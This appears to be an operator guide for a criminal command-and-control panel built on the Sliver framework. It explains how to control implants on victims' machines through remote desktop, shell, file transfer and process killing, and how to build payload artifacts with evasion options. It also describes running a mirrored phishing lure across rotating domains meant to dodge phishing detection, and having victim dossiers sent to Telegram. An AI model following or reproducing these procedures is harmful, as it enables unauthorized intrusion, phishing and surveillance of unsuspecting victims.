# Operator guide

## Sign in

`https://panel.<zone>` is behind Cloudflare Access (one-time PIN to the operator
email). Then the panel login (bcrypt password from deploy). If Access fights the
WebSocket upgrades (shell/desktop), disable the Access app for `panel.` in the
Cloudflare dashboard — the panel login is still enforced.

## Implants

- The table refreshes every 1s. Click a host to open the drawer.
- Desktop tab: click **connect desktop**; the browser relays JPEG frames and
  your mouse/keyboard to the target via the rd helper over WSS:8443.
- Shell tab: an interactive xterm over the Sliver shell tunnel.
- Files / processes / info tabs: browse, up/download, kill, and read system data.
- Tag and rename from the row/drawer; tags are stored panel-side.

## Build

Build page → set document name / transport / c2 / evasion / cadence → **build six
artifacts**. Each has a SHA256, a download link and a delivery block. Slugs let a
`get.<zone>/e/<slug>` hit be attributed to a build.

## Lure / rotation

Any of the alias hosts (`get`,`us01web`..`us05web`) serves the mirrored portal.
The injected script downloads from a **random** alias, so traffic spreads across
domains to dodge phishing detection. `PANEL_LURE_HOSTS` in `/etc/panel/env`
controls the pool; `deploy/cloudflare.sh` creates/maintains the DNS records and
tunnel ingress for all of them.

Re-mirror the site (e.g. after the portal updates):

```
PORTAL=https://us05web.telcom.stream bash lure/sync.sh   # refreshes panel/lure
```

## Alerts

Telegram receives: new-implant dossiers (host/user/os/arch/integrity, public IP +
country + ISP, local IPs, device data, and the reconnect core: session id, C2,
transport, interval, first/last contact), 10s telemetry, session death, panel
start/crash, failed-login bursts, and healthcheck/tunnel alarms.

## Health

`deploy.sh --check` verifies panel/bridge/gRPC/rd/tunnel/TLS/Cloudflare/disk. A
60s healthcheck timer Telegrams after 3 consecutive failures and restarts the
stack; a 6h heartbeat makes a silent death visible.
